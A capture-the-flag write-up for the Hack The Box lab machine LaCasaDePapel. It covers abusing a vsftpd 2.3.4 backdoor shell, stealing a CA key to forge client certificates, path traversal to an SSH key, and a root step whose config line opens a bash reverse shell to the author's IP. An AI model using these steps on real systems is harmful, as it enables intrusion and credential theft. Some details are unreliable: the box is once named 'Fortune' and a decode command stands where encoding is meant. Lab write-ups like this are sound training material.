# LeCasaDePapel

This is the write-up for the box Fortune that got retired at the 27th July 2019.
My IP address was 10.10.14.248 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.131    lecasadepapel.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/fortune.nmap 10.10.10.131
```

```markdown
We get following results:
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix
```

## Checking FTP (Port 21)

The service that runs on port 21 is vsftpd 2.3.4, so we check for knwon vulnerabilites for this version of vsftpd:

```markdown
searchsploit vsftpd
```

And we find that there is a Metasploit module for that exact version.
After we try this the exploit it does not work, so we change the _Verbose_ option to _True_ and running it again will say the following:
> The service on port 6200 does not appear to be a shell

There seems to be something on port 6200 so let's check that:
```markdown
nc 10.10.10.131 6200
```
The information this gives us is:
> Psy Shell v0.9.9 (PHP 7.2.10 - cli)

### Checking the Psy Shell

This shell takes PHP commands, so we check files on the box.

```markdown
scandir(".")
scandir("/home")
```

Now we have potential users on the box. They are called nairobi, dali, berlin, oslo and professor.

```markdown
file_get_contents:("/home/nairobi/ca.key")
```

- User dali: We have permissio and can change .ssh/authorized_keys
- User nairobi: We get contents of ca.key
- User berlin: Has user.txt

We take the contents of _ca.key_ from nairobi to the local machine.

## Checking HTTP (Port 80)

This web page has a QR-code with Google Authenticator installed, so there is propably nothing here.

## Checking HTTPS (Port 443)

This web page tells us:
> Sorry, but you need to provide a client certificate to continue.

As we have the CA private key, we now need the ceritificate chain and then we sign our own certificates.
The certificate chain can be exported from Firefox and saved on the local machine as _lecasadepapel.crt_.

Verify if ca.key is the private key to this certficate:

```markdown
openssl pkey -in ca.key -pubout
openssl x509 -in lacasadepapelhtb.crt -pubkey -noout
```

The output of both is the same so we are good to go.

Now we can generate a client key, a certificate signing request and then sign it:

```markdown
openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.csr
openssl x509 -req -in client.csr -CA lacasadepapelhtb.crt -CAkey ca.key -set_serial 9002 -extensions client -days 9002 -outform PEM -out client.cer
```

After this we need to format it to PKCS12 format so Firefox can use it:

```markdown
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```

This _client.p12_ can be imported into Firefox in the Certificate Store and the _lecasadepapel.crt_ into Authorities.

Now we get something on the web page. We can choose between SEASON-1 and SEASON-2. Both of these links show us a bunch of.avi files.
The filenames in the path of one of this .avi files look like they are Base64 decoded:

```markdown
hxxps://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp
```

If we decode this string it says **SEASON-1/01.avi** so maybe we can browse the file system if we Base64 decode ourr own strings.
Let's decode the string **../.ssh/id_rsa** and paste it into the URL:

```markdown
echo -n ../.ssh/id_rsa | base64 -d
```

### SSH into the server

We paste the contents of the _id_rsa_ into a file on our server:

```markdown
vim ssh.pem
chmod 600 ssh.pem
```

As we enumerated the usernames we just try every user until it works on one of them.

```markdown
ssh -i ssh.pem professor@10.10.10.131
```
It works on professor and we have a SSH session on the box.

## Privilege Escalation

Getting PsPy or another PrivEsc checking tool on the box and checking processes.
We see that the process **memcached** gets called every minute or so. The professor has a _memcached.ini_ in this home directory, so we probably need to work with that.

We don't have permission to write to that file but we have the permission create files.

```markdown
mv memcached.ini ownmemcached.ini
cat ownmemcached.ini > memcached.ini
```

Now we own the _memcached.ini_ file and let it execute whatever we want and we want a reverse shell:

```markdown
command = bash -c "bash -i >& /dev/tcp/10.10.14.248/9001 0>&1"
```

Open a reverse connection on port 9001 and wait until memcached executes again. After that we get a shell as root!
